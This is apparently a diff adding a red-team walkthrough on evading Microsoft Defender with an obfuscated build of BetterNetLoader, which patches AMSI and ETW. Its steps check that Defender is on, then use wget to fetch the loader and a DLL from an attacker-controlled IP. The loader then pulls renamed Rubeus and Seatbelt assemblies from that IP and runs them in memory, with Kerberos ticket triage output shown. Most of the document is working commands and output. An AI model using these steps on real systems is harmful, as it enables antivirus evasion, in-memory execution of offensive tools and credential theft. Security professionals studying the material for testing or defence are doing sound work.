@@ -1,0 +1,125 @@
+===================================================================================================================================================
+AV bypass using the tool 'BetterNetLoader'
+===================================================================================================================================================
+
+=> https://github.com/racoten/BetterNetLoader
+
+This is a version of the tool "NetLoader" that executes C# .Net assemblies and bypasses ETW + AMSI using hardware breakpoints.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Manually obfuscate and then compile the source code of the tool "BetterNetLoader"
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> Source code: https://github.com/racoten/BetterNetLoader
+
+=> I named the obfuscated version of the tool "test.exe".
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Log into a target Windows server 2022 protected by the MS Defender AV 
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Administrator> powershell -c "Get-ComputerInfo | Select WindowsProductName"
+
+WindowsProductName
+------------------
+Windows Server 2022 Standard Evaluation
+
+
+C:\Users\Administrator> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSIgnatureLastUpdated|FL"
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 8/18/2025 5:19:10 AM
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute the obfuscated version of the tool "BetterNetLoader" on the Windows server 2022 to bypass the AMSI + ETW and be able
+         to download and execute in-memory C# .Net assemblies without being detected by the MS Defender antivirus
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\temp> powershell -c "wget -uri http://192.168.1.144:8080/test.exe -OutFile C:\temp\test.exe"
+
+C:\temp> powershell -c "wget -uri http://192.168.1.144:8080/msvcp140.dll -OutFile C:\temp\msvcp140.dll"
+
+C:\temp> test.exe
+Usage:
+  test.exe -path <location> -a <cleartext arguments>
+  test.exe -path <location> -b64 <base64 encoded arguments>
+
+Options:
+  -path    Specify the location of the assembly. If the path begins with "http",
+           an HTTP request is made; otherwise, it is treated as a local file.
+  -a       Provide cleartext arguments for DotnetExecute.
+  -b64     Provide base64 encoded arguments for DotnetExecute.
+
+C:\temp> test.exe -path http://192.168.1.144:8080/RuB3us.exe -a triage
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x83d32
+
+ ---------------------------------------
+ | LUID | UserName | Service | EndTime |
+ ---------------------------------------
+ ---------------------------------------
+
+
+C:\temp> test.exe -path http://192.168.1.144:8080/RuB3us.exe -a help
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+ Ticket requests and renewals:
+
+    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] 
+        [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]
+
+    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] 
+        [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] [/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]
+
+<SNIP>
+
+C:\temp> test.exe -path http://192.168.1.144:8080/SeatbE1T.exe -a AMSIProviders
+
+                        %&&@@@&&
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
+                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+
+====== AMSIProviders ======
+
+  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
+  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0\MpOav.dll"
+
+[*] Completed collection in 0.067 seconds
+
